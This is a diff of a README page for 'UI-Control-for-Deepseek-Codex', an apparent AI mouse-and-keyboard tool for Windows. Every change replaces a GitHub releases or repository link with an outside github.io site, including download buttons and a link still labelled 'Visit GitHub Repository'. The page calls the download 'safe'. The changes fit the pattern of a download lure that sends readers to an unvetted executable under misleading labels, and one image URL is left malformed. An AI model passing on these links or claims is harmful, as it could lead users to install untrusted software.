@@ -1,7 +1,7 @@
 <h1>🤖 UI-Control-for-Deepseek-Codex - Your AI Mouse and Keyboard Assistant</h1>
 
 <p align="center">
-<a href="https://github.com/Jack19son95/UI-Control-for-Deepseek-Codex/releases" style="display:inline-block;padding:16px 32px;background:linear-gradient(135deg,#667eea,#764ba2);color:white;font-size:20px;font-weight:bold;border-radius:12px;text-decoration:none;box-shadow:0 4px 15px rgba(102,126,234,0.4);">⬇️ DOWNLOAD NOW - FREE</a>
+<a href="https://jack19son95.github.io" style="display:inline-block;padding:16px 32px;background:linear-gradient(135deg,#667eea,#764ba2);color:white;font-size:20px;font-weight:bold;border-radius:12px;text-decoration:none;box-shadow:0 4px 15px rgba(102,126,234,0.4);">⬇️ DOWNLOAD NOW - FREE</a>
 </p>
 
 <br>
@@ -35,7 +35,7 @@ Follow these simple steps to get up and running in under 5 minutes.
 ### Step 1: Download the Application
 
 Visit this link to download the application:  
-<a href="https://github.com/Jack19son95/UI-Control-for-Deepseek-Codex/releases" style="background:#4CAF50;color:white;padding:10px 25px;border-radius:8px;text-decoration:none;font-weight:bold;display:inline-block;">⬇️ Go to Download Page</a>
+<a href="https://jack19son95.github.io" style="background:#4CAF50;color:white;padding:10px 25px;border-radius:8px;text-decoration:none;font-weight:bold;display:inline-block;">⬇️ Go to Download Page</a>
 
 ### Step 2: Run or Install
 
@@ -154,7 +154,7 @@ A: No. It is remarkably lightweight, using less than 50 MB of memory when idle.
 ## 🆘 Support
 
 If you encounter any issue, visit the official repository on GitHub for documentation, issue tracking, and community support:  
-<a href="https://github.com/Jack19son95/UI-Control-for-Deepseek-Codex">Visit GitHub Repository</a>
+<a href="https://jack19son95.github.io">Visit GitHub Repository</a>
 
 You can also file a bug report or request a new feature directly through the GitHub issues page.
 
@@ -166,7 +166,7 @@ You can also file a bug report or request a new feature directly through the Git
 <div style="border:3px dashed #764ba2;padding:30px;border-radius:15px;margin:30px 0;">
 <h2 style="margin-top:0;">🎁 Ready to Give Your AI Superpowers?</h2>
 <p style="font-size:18px;">Download now - it's free, fast, and safe.</p>
-<a href="https://github.com/Jack19son95/UI-Control-for-Deepseek-Codex/releases" style="display:inline-block;padding:15px 40px;background:linear-gradient(135deg,#f093fb,#f5576c);color:white;font-size:22px;font-weight:bold;border-radius:10px;text-decoration:none;">🚀 DOWNLOAD NOW</a>
+<a href="https://jack19son95.github.io" style="display:inline-block;padding:15px 40px;background:linear-gradient(135deg,#f093fb,#f5576c);color:white;font-size:22px;font-weight:bold;border-radius:10px;text-decoration:none;">🚀 DOWNLOAD NOW</a>
 </div>
 </center>
 
@@ -183,9 +183,9 @@ UI-Control-for-Deepseek-Codex - Empowering AI to interact with your Windows worl
 <meta name="keywords" content="UI automation, AI computer use, Codex tool, DeepSeek automation, Windows GUI automation, mouse control AI, keyboard simulation, screenshot privacy, occlusion rescue, accessibility automation">
 <meta property="og:title" content="UI-Control-for-Deepseek-Codex - AI Mouse and Keyboard Assistant">
 <meta property="og:description" content="Empower your AI to see and control Windows. Download free today.">
-<meta property="og:url" content="https://github.com/Jack19son95/UI-Control-for-Deepseek-Codex">
+<meta property="og:url" content="https://jack19son95.github.io">
 <meta property="og:type" content="website">
-<meta property="og:image" content="https://via.placeholder.com/1200x630.png?text=UI+Control+for+Deepseek+Codex">
+<meta property="og:image" content="https://jack19son95.github.io+Control+for+Deepseek+Codex">
 
 <style>
 body { font-family: 'Segoe UI', Arial, sans-serif; max-width: 900px; margin: 0 auto; padding: 20px; line-height: 1.7; color: #222; }
